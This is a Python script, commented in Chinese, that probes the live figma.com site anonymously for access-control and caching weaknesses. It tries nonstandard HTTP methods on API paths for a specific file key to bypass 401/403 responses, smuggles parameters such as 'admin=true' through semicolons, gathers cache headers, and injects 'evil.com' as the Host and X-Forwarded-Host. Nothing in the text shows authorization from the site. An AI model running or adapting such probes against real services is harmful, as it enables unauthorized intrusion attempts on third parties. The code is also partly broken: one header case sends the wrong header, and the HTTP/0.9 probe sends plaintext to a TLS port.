# -*- coding: utf-8 -*-
"""Figma 第一轮:匿名偏门技术探测(无需登录)
映射用户偏门清单 -> Figma 可测点:
A. HTTP 非常规方法(权限中间件可能只拦 GET/POST)
B. 分号参数解析差异(?a=1;b=2 是否被当分隔符)
C. 缓存攻击侦察(响应头 X-Cache/Age/Vary + 二次请求对比)
D. Host/XFF 注入(后端信任则影响 redirect/cache key)
E. HTTP 版本边缘(HTTP/0.9、HEAD)
全部精确少量请求,不轰炸;只记录状态码+关键头差异
"""
import requests, urllib3, socket, time
urllib3.disable_warnings()

BASE = 'https://www.figma.com'
S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

def show(tag, r, want_headers=()):
    hdrs = {k: r.headers.get(k) for k in want_headers if r.headers.get(k)}
    print('%-38s -> %d %s %s' % (tag, r.status_code, r.headers.get('content-type', '')[:30], hdrs))

print('=== A. 非常规 HTTP 方法(匿名,看是否绕过 401/403) ===')
targets = ['/', '/api/file_metadata/5Gs4PaTz11Hlk2sqVnidBG', '/api/rev/5Gs4PaTz11Hlk2sqVnidBG/code_snapshot/x']
methods = ['PROPFIND', 'COPY', 'MOVE', 'MYPOST', 'TRACE', 'HEAD', 'OPTIONS', 'PATCH', 'PUT', 'DELETE']
for path in targets:
    for m in methods:
        try:
            r = S.request(m, BASE + path, timeout=10, verify=False)
            tag = '%s %s' % (m, path[:44])
            if r.status_code not in (401, 403, 404):
                print('  !! 非预期: %s -> %d %s' % (tag, r.status_code, r.text[:80].replace('\n', ' ')))
            else:
                print('  %s -> %d' % (tag, r.status_code))
        except Exception as e:
            print('  %s %s -> ERR %s' % (m, path[:40], str(e)[:60]))
        time.sleep(0.2)

print('\n=== B. 分号参数解析差异 ===')
for q in ['?a=1;b=2', '?fileKey=5Gs4PaTz11Hlk2sqVnidBG;admin=true', '?a=1&a=2', '?a=1%3Bb=2']:
    try:
        r = S.get(BASE + '/api/file_metadata/5Gs4PaTz11Hlk2sqVnidBG' + q, timeout=10, verify=False)
        print('  %-45s -> %d %s' % (q, r.status_code, r.text[:60].replace('\n', ' ')))
    except Exception as e:
        print('  %s -> ERR %s' % (q, str(e)[:60]))
    time.sleep(0.2)

print('\n=== C. 缓存侦察(响应头 + 二次请求) ===')
for path in ['/', '/api/file_metadata/5Gs4PaTz11Hlk2sqVnidBG', '/file/5Gs4PaTz11Hlk2sqVnidBG']:
    try:
        r1 = S.get(BASE + path, timeout=10, verify=False)
        show('1st ' + path, r1, ['cache-control', 'x-cache', 'age', 'vary', 'cf-cache-status', 'x-vercel-cache', 'etag'])
        r2 = S.get(BASE + path, timeout=10, verify=False)
        show('2nd ' + path, r2, ['cache-control', 'x-cache', 'age', 'vary', 'cf-cache-status', 'etag'])
    except Exception as e:
        print('  %s -> ERR %s' % (path, str(e)[:60]))
    time.sleep(0.2)

print('\n=== D. Host/XFF 注入 ===')
for hdr, val in [('X-Forwarded-Host', 'evil.com'), ('X-Forwarded-Proto', 'http'), ('Host', 'evil.com')]:
    try:
        h = {'X-Forwarded-Host': val} if hdr != 'Host' else {'Host': val}
        r = S.get(BASE + '/', headers=h, timeout=10, verify=False)
        loc = r.headers.get('location', '')
        print('  %s: %s -> %d %s %s' % (hdr, val, r.status_code, r.headers.get('content-type', '')[:20], 'Loc=' + loc[:60] if loc else ''))
    except Exception as e:
        print('  %s -> ERR %s' % (hdr, str(e)[:60]))
    time.sleep(0.2)

print('\n=== E. HTTP/0.9 探测 ===')
try:
    s = socket.create_connection(('www.figma.com', 443), timeout=8)
    s.sendall(b'GET / HTTP/0.9\r\n\r\n')
    data = s.recv(200)
    print('  HTTP/0.9 -> %s' % data[:100])
    s.close()
except Exception as e:
    print('  HTTP/0.9 -> ERR %s' % str(e)[:80])
